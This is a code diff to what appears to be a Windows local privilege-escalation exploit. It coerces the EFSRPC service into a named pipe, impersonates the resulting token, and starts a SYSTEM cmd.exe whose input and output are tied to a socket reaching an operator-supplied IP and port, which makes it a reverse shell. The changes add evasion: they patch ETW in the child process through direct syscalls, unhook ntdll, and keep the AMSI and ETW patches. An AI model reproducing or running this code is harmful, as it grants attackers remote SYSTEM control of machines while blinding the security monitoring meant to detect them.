@@ -8,7 +8,6 @@
 #include "util.h"
 #include <winsock2.h>
 
-
 void* __RPC_USER MIDL_user_allocate(size_t n) {
     return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
 }
@@ -26,10 +25,10 @@ static handle_t couch_bind(void) {
     handle_t bh = NULL;
 
     st = RpcStringBindingComposeW(
-        (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",  // efsrpc UUID
+        (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",
         (RPC_WSTR)L"ncacn_np",
         (RPC_WSTR)L"\\\\localhost",
-        (RPC_WSTR)L"\\pipe\\efsrpc",                         // efsrpc pipe
+        (RPC_WSTR)L"\\pipe\\efsrpc",
         NULL, &sb);
     if (st) { printf("[-] Compose: %ld\n", st); return NULL; }
 
@@ -48,7 +47,6 @@ static handle_t couch_bind(void) {
     return bh;
 }
 
-
 DWORD WINAPI efs_trigger(LPVOID param) {
     printf("[*] Trigger running\n");
 
@@ -62,7 +60,6 @@ DWORD WINAPI efs_trigger(LPVOID param) {
         }
         CloseServiceHandle(hSCM);
     }
-
 
     handle_t ht = couch_bind();
     if (!ht) return 1;
@@ -89,7 +86,7 @@ DWORD WINAPI efs_trigger(LPVOID param) {
     return 0;
 }
 
-VOID efs_escalate(char* ip,char* port) {
+VOID efs_escalate(char* ip, char* port) {
     HANDLE hpipe = CreateNamedPipeA(
         "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
         PIPE_ACCESS_DUPLEX,
@@ -164,19 +161,37 @@ VOID efs_escalate(char* ip,char* port) {
     si.hStdOutput = (HANDLE)sock;
     si.hStdError = (HANDLE)sock;
     si.dwFlags = STARTF_USESTDHANDLES;
+
     if (!CreateProcessAsUserW(h_new,
         L"C:\\Windows\\System32\\cmd.exe",
         NULL, NULL, NULL,
-        TRUE,  
+        TRUE,
         0, NULL, NULL, &si, &pi)) {
         printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
     }
     else {
+        // patch EtwEventWrite in child 
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
+        PVOID pWriteAddr = pEtwAddr; 
+        g_ssn = getSSN("NtProtectVirtualMemory");
+        g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+        BYTE  patch = 0xC3;
+        SIZE_T sz = 1;
+        ULONG old = 0;
+        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, PAGE_EXECUTE_READWRITE, &old);
+        WriteProcessMemory(pi.hProcess, pWriteAddr, &patch, 1, NULL);  
+        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, old, &old);
+        FlushInstructionCache(pi.hProcess, pWriteAddr, 1);
         printf("[+] SYSTEM shell spawned\n");
+
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
+    CloseHandle(h_new);
+    closesocket(sock);
+    WSACleanup();
 }
 
 int main(void) {
@@ -196,12 +211,10 @@ int main(void) {
     strncpy(ip, a, s - a);
     strcpy(port, s + 1);
 
-
-    EtwPatch();
+    unhook_Ntdll();
+    EtwPatch();  
     AmsiPatch();
-    efs_escalate(ip,port);
-
-
+    efs_escalate(ip, port);
 
     return 0;
 }
